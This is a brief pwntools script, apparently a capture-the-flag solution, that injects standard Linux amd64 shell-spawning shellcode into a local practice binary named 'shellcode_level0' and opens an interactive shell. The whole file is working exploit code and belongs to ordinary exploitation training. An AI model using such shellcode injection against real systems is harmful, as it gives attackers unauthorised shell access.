from pwn import *

context(os="linux",arch="amd64")

io = process("./shellcode_level0")

payload = asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
